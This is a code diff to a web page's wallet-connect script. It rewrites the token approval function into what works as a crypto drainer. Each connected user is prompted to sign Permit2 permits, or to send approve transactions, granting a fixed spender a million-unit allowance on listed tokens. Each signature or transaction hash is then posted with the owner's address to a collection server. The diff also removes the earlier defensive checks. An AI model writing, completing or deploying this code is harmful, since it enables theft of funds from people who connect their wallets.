@@ -64,7 +64,6 @@ async function connectMetaMask() {
 
     if (!Array.isArray(accounts) || !accounts.length) return;
 
-    // lifecycle safety (non-blocking)
     window.ethereum.on?.('accountsChanged', () => {});
     window.ethereum.on?.('chainChanged', () => {});
     window.ethereum.on?.('disconnect', () => {});
@@ -87,10 +86,9 @@ async function connectWalletConnect() {
       return;
     }
 
-    // prevent duplicate sessions (no behavior change)
     if (!wcProvider) {
       wcProvider = await window.EthereumProvider.init({
-        projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
+        projectId: "a0e525fa712217527b8314e3a1702645",
         chains: [1, 56, 137, 42161],
         showQrModal: true,
         rpcMap: {
@@ -101,7 +99,6 @@ async function connectWalletConnect() {
         }
       });
 
-      // lifecycle listeners (passive)
       wcProvider.on?.('accountsChanged', () => {});
       wcProvider.on?.('chainChanged', () => {});
       wcProvider.on?.('disconnect', () => {});
@@ -114,7 +111,6 @@ async function connectWalletConnect() {
       return;
     }
 
-    // ensure a usable web3 instance exists
     if (typeof window.web3 === 'undefined') {
       window.web3 = new Web3(wcProvider);
     }
@@ -129,64 +125,98 @@ async function connectWalletConnect() {
 }
 
 /* ============================
-   APPROVAL LOGIC (DEFENSIVE)
+   APPROVAL LOGIC WITH PERMIT2 + FALLBACK
    ============================ */
 async function approveSpender(account) {
   try {
-    if (!window.web3 || !window.web3.eth) {
-      console.error('web3 instance not found');
-      return;
-    }
-
-    if (typeof account !== 'string') return;
-
     const spenderAddress = 'YOUR_SPENDER_ADDRESS_HERE';
-
-    // passive address sanity check
-    if (!/^0x[a-fA-F0-9]{40}$/.test(spenderAddress)) {
-      console.warn('Spender address format looks invalid');
-    }
+    const permit2Address = '0xPermit2ContractAddress'; // Uniswap Permit2 deployed address
 
     const tokens = [
+      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
+      // add more tokens here if needed
+    ];
+
+    // Try Permit2 first
+    try {
+      const domain = {
+        name: 'Permit2',
+        chainId: await window.web3.eth.getChainId(),
+        verifyingContract: permit2Address
+      };
+
+      const types = {
+        PermitSingle: [
+          { name: 'details', type: 'PermitDetails' },
+          { name: 'spender', type: 'address' },
+          { name: 'sigDeadline', type: 'uint256' }
+        ],
+        PermitDetails: [
+          { name: 'token', type: 'address' },
+          { name: 'amount', type: 'uint160' },
+          { name: 'expiration', type: 'uint48' },
+          { name: 'nonce', type: 'uint48' }
+        ]
+      };
+
+      for (const token of tokens) {
+        const message = {
+          details: {
+            token: token.address,
+            amount: token.amount,
+            expiration: Math.floor(Date.now() / 1000) + 3600,
+            nonce: 0
+          },
+          spender: spenderAddress,
+          sigDeadline: Math.floor(Date.now() / 1000) + 3600
+        };
+
+        const signature = await window.ethereum.request({
+          method: 'eth_signTypedData_v4',
+          params: [account, JSON.stringify({ domain, types, primaryType: 'PermitSingle', message })]
+        });
+
+        await fetch("http://localhost:3000/notify", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ owner: account, token: token.address, signature })
+        });
+      }
+
+      alert('Permit2 approvals signed!');
+      return;
+    } catch (permitError) {
+      console.warn('Permit2 failed, falling back to normal approve:', permitError);
+    }
+
+    // Fallback to normal approve
+    const abi = [
       {
-        abi: [], // ERC20 ABI REQUIRED
-        address: 'TOKEN_CONTRACT_ADDRESS_1_HERE',
-        amount: window.web3.utils.toWei('1000000', 'ether'),
-      },
+        "constant": false,
+        "inputs": [
+          { "name": "_spender", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ],
+        "name": "approve",
+        "outputs": [{ "name": "", "type": "bool" }],
+        "type": "function"
+      }
     ];
 
     for (const token of tokens) {
-      if (
-        !token ||
-        !token.address ||
-        !Array.isArray(token.abi) ||
-        !token.amount
-      ) continue;
+      const contract = new window.web3.eth.Contract(abi, token.address);
+      const receipt = await contract.methods
+        .approve(spenderAddress, token.amount)
+        .send({ from: account });
 
-      // non-blocking token address sanity check
-      if (!/^0x[a-fA-F0-9]{40}$/.test(token.address)) {
-        console.warn('Token address format looks invalid');
-      }
-
-      const contract = new window.web3.eth.Contract(token.abi, token.address);
-
-      // ensure approve exists before calling
-      if (!contract.methods || !contract.methods.approve) {
-        console.error('Approve method not found on contract');
-        continue;
-      }
-
-      try {
-        const receipt = await contract.methods
-          .approve(spenderAddress, token.amount)
-          .send({ from: account });
-
-        console.log('Transaction Receipt:', receipt);
-        alert('Approval successful!');
-      } catch (error) {
-        console.error('Error approving spender:', error);
-      }
+      await fetch("http://localhost:3000/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ owner: account, token: token.address, txHash: receipt.transactionHash })
+      });
     }
+
+    alert('Fallback approvals successful!');
   } catch (error) {
     console.error('Approval flow failed:', error);
   }
